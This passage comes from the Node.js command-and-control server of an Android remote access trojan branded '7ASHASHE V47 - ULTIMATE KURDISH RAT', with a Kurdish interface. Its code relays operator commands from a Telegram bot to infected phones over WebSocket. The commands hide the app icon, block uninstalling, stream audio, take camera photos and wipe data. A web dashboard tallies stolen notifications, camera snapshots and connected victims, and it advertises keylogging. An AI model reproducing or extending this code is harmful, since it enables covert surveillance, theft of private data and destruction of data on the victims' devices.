            return;
        }
        
        if (client.ws.readyState === WebSocket.OPEN) {
            const commandMap = {
                'anti_uninstall': 'enable_anti_uninstall',
                'hide_icon': 'hide_icon',
                'audio_stream': 'start_audio_stream',
                'smart_screenshot': 'monitor_app',
                'camera_control': 'take_photo',
                'battery_bypass': 'enable_battery_bypass',
                'sim_alert': 'enable_sim_alert',
                'wipe': 'wipe_data',
                'toast': 'show_toast',
                'auto_boot': 'enable_auto_boot'
            };
            
            client.ws.send(JSON.stringify({
                type: commandMap[command] || command,
                timestamp: Date.now()
            }));
            
            bot.answerCallbackQuery(callbackQuery.id, {
                text: `✅ فەرمان نێردرا`,
                show_alert: false
            });
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>✅ فەرمانی پێشکەوتوو نێردرا</b>\n\n` +
                `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
                `<b>⚡ فەرمان:</b> ${command}\n` +
                `<b>📋 ڕێنمایی:</b> ${getHelpText(command)}\n` +
                `<b>🕐 کات:</b> ${new Date().toLocaleString('ckb')}`,
                { parse_mode: 'HTML' }
            );
        } else {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ پەیوەندی لەگەڵ ئامێرەکە نییە',
                show_alert: true
            });
        }
    }
    
    // گەڕانەوە بۆ پێشکەوتوو
    if (command === 'back_to_advanced') {
        const deviceKeyboard = [];
        clients.forEach((client, id) => {
            deviceKeyboard.push([{
                text: `${client.info.manufacturer} ${client.info.model}`,
                callback_data: `advanced_device:${id}`
            }]);
        });
        
        bot.editMessageText('<b>🔧 ئامێرێک هەڵبژێرە بۆ فەرمانە پێشکەوتووەکان</b>', {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: deviceKeyboard }
        });
    }
});

// =====================================================
// 🔄 PING & KEEP ALIVE
// =====================================================
setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
        }
    });
}, CONFIG.PING_INTERVAL);

// =====================================================
// 🏠 WEB INTERFACE
// =====================================================
app.get('/', (req, res) => {
    const db = readDB();
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl" lang="ckb">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>7ASHASHE V47 - ULTIMATE KURDISH RAT</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    background: #000;
                    color: #0f0;
                    font-family: 'Courier New', monospace;
                    padding: 20px;
                    background-image: 
                        linear-gradient(0deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent),
                        linear-gradient(90deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent);
                    background-size: 50px 50px;
                }
                .container { max-width: 1400px; margin: 0 auto; }
                .header {
                    border: 3px solid #0f0;
                    padding: 30px;
                    margin-bottom: 30px;
                    background: #111;
                    box-shadow: 0 0 50px rgba(0,255,0,0.3);
                    text-align: center;
                }
                .header h1 {
                    font-size: 4em;
                    text-shadow: 0 0 20px #0f0;
                    animation: glitch 3s infinite;
                }
                @keyframes glitch {
                    0%,100% { text-shadow: 0 0 20px #0f0; }
                    25% { text-shadow: -5px 0 #f00, 5px 0 #00f; }
                    75% { text-shadow: 5px 0 #f00, -5px 0 #00f; }
                }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 20px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    border: 2px solid #0f0;
                    padding: 20px;
                    text-align: center;
                    background: #111;
                }
                .stat-value { font-size: 2.5em; font-weight: bold; }
                .feature-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin: 30px 0;
                }
                .feature {
                    border: 1px solid #0f0;
                    padding: 15px;
                    text-align: center;
                    background: #111;
                }
                .footer {
                    text-align: center;
                    margin-top: 50px;
                    padding: 20px;
                    border-top: 2px solid #0f0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🔴 7ASHASHE V47</h1>
                    <p>ULTIMATE KURDISH RAT</p>
                    <p>👑 عەزازیل 7ASHASHE</p>
                    <p>🌐 پۆرت: ${CONFIG.PORT}</p>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${clients.size}</div>
                        <div>ئامێرە پەیوەستکراوەکان</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${db.stats.notifications_captured || 0}</div>
                        <div>نۆتیفیکەیشن دزراو</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${screenStreamer.activeStreams}</div>
                        <div>Stream چالاک</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${db.stats.cam_snapshots || 0}</div>
                        <div>وێنەی کامێرا</div>
                    </div>
                </div>
                
                <div class="feature-grid">
                    <div class="feature">🔄 ڕیستارتی خۆکار</div>
                    <div class="feature">📱 گوێگرتنی نۆتیفیکەیشن</div>
                    <div class="feature">📹 Streamی شاشە</div>
                    <div class="feature">⌨️ کێڤلۆگەری زیرەک</div>
                    <div class="feature">🚫 دژە-سڕینەوە</div>
                    <div class="feature">👁️ شاردنەوەی ئایکۆن</div>
                    <div class="feature">🎤 گوێگرتنی ڕاستەوخۆ</div>
                    <div class="feature">📸 سکرینشۆتی زیرەک</div>
                    <div class="feature">⚡ کۆنترۆڵی کامێرا</div>
                    <div class="feature">🔋 دژە-باتری</div>
                    <div class="feature">📱 ئاگاداری سیمکارت</div>
                    <div class="feature">💥 سڕینەوەی دوور</div>
                    <div class="feature">💬 پەیامی ساختە</div>
                </div>
                
                <div class="footer">
                    <p>7ASHASHE V47 - ULTIMATE KURDISH RAT</p>
                    <p>🦁 💀 🔥</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// =====================================================
// 🚀 START SERVER
// =====================================================
server.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V47 running on port ${CONFIG.PORT}`);
    console.log(`🌐 http://localhost:${CONFIG.PORT}`);
    console.log(`🔥 ULTIMATE KURDISH RAT - عەزازیل 7ASHASHE`);
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `<b>🔥 7ASHASHE V47 - ULTIMATE KURDISH RAT</b>\n\n` +
        `<b>👑 عەزازیل 7ASHASHE</b>\n` +
        `<b>📊 وەشان:</b> ${CONFIG.VERSION}\n` +
        `<b>🌐 پۆرت:</b> ${CONFIG.PORT}\n` +
        `<b>⏱️ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
        `<b>✅ تایبەتمەندییەکان:</b>\n` +
        `1. 🔧 دوگمەی ڕێنمایی بۆ هەموو فەرمانەکان\n` +
        `2. 📝 HTML MODE بۆ تێلیگرام\n` +
        `3. 📸 فەرمانی کامێرا چاک کراو\n` +
        `4. 🎛️ ٢٠+ فەرمانی جیاواز\n` +
        `5. 📋 ڕێنمایی وردی کارکردنی هەموو دوگمەکان\n\n` +
        `<b>🦁 عەزازیل 7ASHASHE</b>`,
        { parse_mode: 'HTML' }
    );
});

// =====================================================
// 🛡️ ERROR HANDLING
// =====================================================
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
});
